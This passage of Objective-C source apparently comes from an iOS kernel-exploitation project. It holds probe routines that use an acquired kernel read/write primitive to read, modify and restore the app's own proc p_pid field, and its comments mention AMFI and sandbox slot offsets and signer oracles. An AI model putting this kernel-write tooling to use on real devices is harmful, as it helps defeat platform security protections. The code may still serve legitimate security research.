        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}

void CNDPhysicalKCall1ProbeRun(
    CNDPhysicalKCall1ProbeCompletion completion)
{
    CNDPhysicalKCall1ProbeRunMode(
        CNDPhysicalKCall1ProbeModeChosenPC, completion);
}

void CNDPhysicalKCall1UatPTEProbeRun(
    CNDPhysicalKCall1ProbeCompletion completion)
{
    CNDPhysicalKCall1ProbeRunMode(
        CNDPhysicalKCall1ProbeModeUatPTE, completion);
}

void CNDPhysicalKCall1UatSignerOracleRun(
    CNDPhysicalKCall1ProbeCompletion completion)
{
    CNDPhysicalKCall1ProbeRunMode(
        CNDPhysicalKCall1ProbeModeSignerOracle, completion);
}

/*
 * Scratch-write oracle: is *any* 32-byte write possible through the live
 * (recovered, parked) KRW pair?  Two runs of the signer oracle refused with
 * write=-1/EFAULT while reads of the same objects worked, so this probe
 * separates "the write direction is dead on the recovered pair" from "the MAC
 * label is in a region the write path cannot reach".
 *
 * Target: the app's own proc->p_pid, found via the same proc_self() the
 * signer oracle uses.  This is a kernel object we own, already proven
 * readable, whose exact expected value is known from userland (getpid()).
 * It avoids inventing an allocation or reading any unanchored pointer.
 *
 * Protocol: read 32 bytes at &p_pid, flip one byte inside p_pid (value
 * becomes non-real but harmless - nothing reads our own pid mid-probe),
 * write, read back, then restore the original 32 bytes unconditionally and
 * verify.  Reports which stage failed.  Never acquires or cleans up KRW.
 */
static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunScratchWriteOnce(void)
{
    NSArray<NSString *> *documents = NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *directory = documents.firstObject ?: NSTemporaryDirectory();
    NSString *reportPath = [directory stringByAppendingPathComponent:
        @"CNDPhysicalKCall1ScratchWrite.json"];
    NSMutableDictionary<NSString *, id> *report = [@{
        @"schema": @"com.zeroxjf.cyanide.physical-kcall1-scratch-write",
        @"schemaVersion": @1,
        @"productType": CNDPhysicalKCall1SysctlString("hw.machine"),
        @"productBuildVersion": CNDPhysicalKCall1SysctlString("kern.osversion"),
        @"krwAcquisitionAttempted": @NO,
        @"krwCleanupAttempted": @NO,
        @"kernelReadUsed": @NO,
        @"kernelWriteUsed": @NO,
        @"reportPath": reportPath,
        @"state": @"starting",
    } mutableCopy];
    CNDPhysicalKCall1Persist(report, reportPath, nil, nil);

    CNDPhysicalKCall1KernelAPI kernel = {0};
    if (!CNDPhysicalKCall1ResolveKernelAPI(&kernel)) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-api-unavailable");
        return report;
    }
    if (*kernel.amfiSlotOffset == 0 || *kernel.sandboxSlotOffset == 0) {
        kernel.offsetsInit();
    }
    if (!kernel.krwReady()) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-krw-not-ready");
        return report;
    }

    uint64_t proc = kernel.procSelf();
    report[@"selfProc"] = CNDPhysicalKCall1Hex(proc);
    if (!CNDPhysicalKCall1KernelObject(proc)) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-self-proc");
        return report;
    }
    extern uint32_t off_proc_p_pid;  /* offsets.m; nonzero after offsetsInit */
    uint32_t pidOffset = off_proc_p_pid;
    report[@"pidOffset"] = @(pidOffset);
    if (pidOffset == 0 || pidOffset > 0x400) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-pid-offset");
        return report;
    }
    uint64_t target = proc + pidOffset;
    report[@"targetAddress"] = CNDPhysicalKCall1Hex(target);
    report[@"hostPid"] = @(getpid());

    uint8_t original[CNDPhysicalKCall1LabelSize] = {0};
    report[@"kernelReadUsed"] = @YES;
    if (!CNDPhysicalKCall1ReadBytes(&kernel, target, original,
            sizeof(original))) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-initial-read");
        return report;
    }
    uint32_t observedPid = 0;
    memcpy(&observedPid, original, sizeof(observedPid));
    report[@"observedPid"] = @(observedPid);
    if (observedPid != (uint32_t)getpid()) {
        CNDPhysicalKCall1Persist(report, reportPath, @"result",
            @"refused-pid-mismatch");
        return report;
    }

    /* Flip the low byte of p_pid only. */
    uint8_t modified[CNDPhysicalKCall1LabelSize];
    memcpy(modified, original, sizeof(modified));
    modified[0] = original[0] ^ 0x5a;

    errno = 0;
    report[@"kernelWriteUsed"] = @YES;
    bool writeAccepted = kernel.write32BytesChecked(target, modified);
    int writeError = errno;
    report[@"writeAccepted"] = @(writeAccepted);
    report[@"writeErrno"] = @(writeAccepted ? 0 : writeError);

    uint8_t afterWrite[CNDPhysicalKCall1LabelSize] = {0};
    bool afterRead = CNDPhysicalKCall1ReadBytes(&kernel, target, afterWrite,
        sizeof(afterWrite));
    report[@"afterWriteReadCaptured"] = @(afterRead);
    report[@"writeLanded"] = @(afterRead &&
        memcmp(afterWrite, modified, sizeof(modified)) == 0);
    report[@"writeChangedMemory"] = @(afterRead &&
        memcmp(afterWrite, original, sizeof(original)) != 0);

    /* Restore unconditionally: even a failed write must not be assumed
     * no-op (it may have partially landed).  Same-address restore of the
     * captured original is always safe when it verifies. */
    bool restoreAccepted = false;
    int restoreErrno = 0;
    if (afterRead && memcmp(afterWrite, original, sizeof(original)) == 0) {
        restoreAccepted = true;  /* nothing changed; nothing to restore */
    } else {
        errno = 0;
        restoreAccepted = kernel.write32BytesChecked(target, original);
        restoreErrno = errno;
    }
    report[@"restoreAccepted"] = @(restoreAccepted);
    report[@"restoreErrno"] = @(restoreAccepted ? 0 : restoreErrno);
    uint8_t afterRestore[CNDPhysicalKCall1LabelSize] = {0};
    bool restoreRead = CNDPhysicalKCall1ReadBytes(&kernel, target,
        afterRestore, sizeof(afterRestore));
    bool restoreVerified = restoreRead &&
        memcmp(afterRestore, original, sizeof(original)) == 0;
    report[@"restoreVerified"] = @(restoreVerified);

    NSString *result;
    bool writeLanded = afterRead &&
        memcmp(afterWrite, modified, sizeof(modified)) == 0;
    if (writeLanded) {
        result = restoreVerified ? @"write-lands-on-owned-proc-field"
                                 : @"critical-restore-failed";
    } else {
        result = @"write-refused-on-owned-proc-field";
    }
    CNDPhysicalKCall1Persist(report, reportPath, @"result", result);
    return report;
}

void CNDPhysicalKCall1ScratchWriteOracleRun(
    CNDPhysicalKCall1ProbeCompletion completion)
{
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalKCall1ProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The physical kcall1 probe is already running.",
            });
        });
        return;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalKCall1RunScratchWriteOnce();
        __sync_lock_release(&gCNDPhysicalKCall1ProbeRunning);
        if ([report isKindOfClass:NSMutableDictionary.class]) {
            NSMutableDictionary<NSString *, id> *finished =
                (NSMutableDictionary<NSString *, id> *)report;
            CNDPhysicalKCall1Persist(finished, finished[@"reportPath"],
                @"state", @"finished");
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}

void CNDPhysicalKCall1UatSignerInventoryRun(
    CNDPhysicalKCall1ProbeCompletion completion)
{
    if (!__sync_bool_compare_and_swap(
            &gCNDPhysicalKCall1ProbeRunning, 0, 1)) {
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(@{
                @"result": @"refused-already-running",
                @"message": @"The physical kcall1 probe is already running.",
            });
        });
        return;
    }
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSDictionary<NSString *, id> *report =
            CNDPhysicalKCall1RunSignerInventoryOnce();
        __sync_lock_release(&gCNDPhysicalKCall1ProbeRunning);
        if ([report isKindOfClass:NSMutableDictionary.class]) {
            NSMutableDictionary<NSString *, id> *finished =
                (NSMutableDictionary<NSString *, id> *)report;
            CNDPhysicalKCall1Persist(finished, finished[@"reportPath"],
                @"state", @"finished");
        }
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(report ?: @{ @"result": @"unknown-result" });
        });
    });
}
